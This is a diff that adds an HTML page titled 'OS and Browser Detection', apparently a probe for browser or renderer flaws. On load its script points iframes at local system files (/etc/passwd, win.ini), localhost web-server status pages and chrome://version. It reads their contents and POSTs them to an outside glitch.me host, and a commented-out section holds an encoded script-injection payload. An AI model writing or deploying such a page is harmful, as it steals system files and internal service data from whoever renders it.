@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Checking</title>
+    <script>
+
+      
+      document.addEventListener('DOMContentLoaded', function() {
+            var platform = navigator.platform;
+            var userAgent = navigator.userAgent;
+            var uaOs;
+            var webServer = "unknown";
+        
+            // OS from User-agent
+            if (userAgent.includes('Windows')) {
+                uaOs = 'Windows';
+            } else if (userAgent.includes('Linux')) {
+                uaOs = 'Linux';
+            }
+
+             // OS 
+            if (platform.includes('Win')) {
+                platform = 'Windows';
+            } else if (platform.includes('Linux')) {
+                platform = 'Linux';
+            } else {
+                platform = uaOs;
+            }
+        
+            // logging OS, browser version
+            console.log("Platform: " + platform);
+            console.log("User-Agent: " + userAgent);
+            console.log("Determined OS: " + uaOs);
+
+            // set iframe src
+            if (platform == "Linux" ){
+              document.getElementById('iframe1').src  = 'file:///etc/passwd';
+              document.getElementById('iframe11').src = 'https://artistic-spiny-network.glitch.me/checkrdrt_file_l.html';
+              
+            }   
+            else{
+              document.getElementById('iframe1').src  = 'file:///C://Windows//win.ini';
+              document.getElementById('iframe11').src = 'https://artistic-spiny-network.glitch.me/checkrdrt_file_w.html';
+            }                        
+
+            document.getElementById('iframe2_1').src   = 'http://127.0.0.1/qwer.html';
+            document.getElementById('iframe2').src   = 'http://127.0.0.1';
+            ////document.getElementById('iframe3').src = 'http://127.0.0.1';
+            document.getElementById('iframe4').src    = 'chrome://version';
+
+            document.getElementById('iframe12').src   = 'https://artistic-spiny-network.glitch.me/checkrdrt_127.html';
+
+        
+            // iframe1 onload    
+            var iframe1 = document.getElementById('iframe1');
+            iframe1.onload = function() {
+                var iframeContent = iframe1.contentWindow.document.body.innerHTML;
+              
+                //transfer data
+                sendDataToServer(document.getElementById('iframe1').src , iframeContent);
+            };
+
+        
+        
+        
+/////////////////////////////////////////////////
+//             //<script src="data:text/javascript,window.location.href='https://bing.com"><//script>
+//             //var estr = "%3Cscript%20src%3D%22data%3Atext/javascript%2Cwindow.location.href%3D%27https%3A//bing.com%27%22%3E%3C/script%3E";
+            
+//             //<script src="data:text/javascript,alert(document.domain)"><//script>
+//             var estr = "%3Cscript%20src%3D%22data%3Atext/javascript%2Calert%28document.domain%29%22%3E%3C/script%3E";
+                
+                
+//             document.getElementById('iframeT').srcdoc   = decodeURIComponent(estr);
+
+//             // iframeT onload    
+//             var iframeT = document.getElementById('iframeT');
+//             iframeT.onload = function() {
+//                 console.dir(iframeT);
+//               console.dir(iframeT.contentWindow);
+//                 var iframeContent = iframeT.contentWindow.document.body.innerHTML;
+//                 console.log("111111");  
+//                 console.dir(iframeT.contentWindow.document);
+//                 //transfer data
+//                 //sendDataToServer(document.getElementById('iframe1').src , iframeContent);
+//             };
+/////////////////////////////////////////////////            
+        
+
+            
+        
+            // iframe2_1의 로딩을 처리하는 함수
+            function loadIframe2_1() {
+                return new Promise((resolve, reject) => {
+                    var iframe2_1 = document.getElementById('iframe2_1');
+                    iframe2_1.onload = function() {
+                        var iframeContent_tmp = iframe2_1.contentWindow.document.body.innerHTML.toLowerCase();
+                        if (iframeContent_tmp.includes('apache')) {
+                            webServer = "apache";
+                        } else if (iframeContent_tmp.includes('nginx')) {
+                            webServer = "nginx";
+                        }
+                        resolve(); // iframe2_1 로딩 완료
+                    };
+                    //iframe2_1.src = '';
+                });
+            }
+
+            // iframe2_1 로딩 후 iframe2 로딩 처리
+            loadIframe2_1().then(() => {
+                var iframe2 = document.getElementById('iframe2');
+                iframe2.onload = function() {
+                    var iframeContent = iframe2.contentWindow.document.body.innerHTML.toLowerCase();
+
+                    if (webServer == 'unknown') {
+                        if (iframeContent.includes('apache')) {
+                            webServer = "apache";
+                        } else if (iframeContent.includes('nginx')) {
+                            webServer = "nginx";
+                        }
+                    }
+
+                    //transfer data
+                    sendDataToServer(iframe2.src, iframeContent);
+
+                  
+//*  ERROR  ************ iframe3이 요청이 안감 !!!!!!!!!!!!!!!!
+                  
+                  
+                    // iframe3의 src 설정
+                    var iframe3 = document.getElementById('iframe3');
+                    if (webServer == "apache") {
+                        iframe3.src = 'http://127.0.0.1/server-status';
+                    } else if (webServer == "nginx") {
+                        iframe3.src = 'http://127.0.0.1/nginx_status';
+                    }
+                  
+                    iframe3.onload = function() {
+                    var iframeContent = iframe3.contentWindow.document.body.innerHTML;
+
+                    //transfer data
+                    sendDataToServer(document.getElementById('iframe3').src , iframeContent);
+                    };
+
+                  
+                };
+              //iframe2_1.src = 'http://127.0.0.1';
+                
+            });
+
+        
+        
+      });
+
+      
+    // Transfer data to server
+    function sendDataToServer(url, data) {
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', 'https://artistic-spiny-network.glitch.me/receive', true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState === XMLHttpRequest.DONE) {
+                // process data
+                if (xhr.status === 200) {
+                    console.log('send data');
+                } else {
+                    console.log('Errors in transit');
+                }
+            }
+        };
+
+        // trans data (json)
+        xhr.send(JSON.stringify({ url: url, data: data }));
+    }
+
+    </script>
+</head>
+<body>
+    <h1>OS and Browser Detection</h1>
+    <iframe id="iframe1" width="300" height="200"></iframe>
+    <iframe id="iframe2" width="300" height="200"></iframe>
+    <iframe id="iframe2_1" width="300" height="200"></iframe>
+    <iframe id="iframe3" width="300" height="200"></iframe>
+    <iframe id="iframe4" width="300" height="200"></iframe>
+  
+    <iframe id="iframe11" width="300" height="200"></iframe>
+    <iframe id="iframe12" width="300" height="200"></iframe>
+    <iframe id="iframe13" width="300" height="200"></iframe>
+  
+    <iframe id="iframeT"></iframe>
+      
+  
+</body>
+</html>
